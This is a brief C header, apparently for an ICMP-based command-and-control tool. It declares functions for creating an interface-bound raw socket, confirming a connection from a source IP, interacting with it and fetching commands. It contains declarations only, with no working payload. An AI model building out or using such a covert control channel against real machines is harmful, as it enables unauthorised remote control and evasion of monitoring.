#ifndef C2_H
#define C2_H
#include <stdint.h>
#include <netinet/ip_icmp.h>
#include <linux/types.h>

#ifndef ICMP_FILTER
#define ICMP_FILTER	1
struct icmp_filter {
	__u32 data;
};
#endif

void c2_init_n_call(char *interface_to_bind);
int create_socket(char *inteface_to_bind);
void interact(int sockfd);
void print_connection_succeed(char *src_ip);
unsigned char *get_command(char *input);
#endif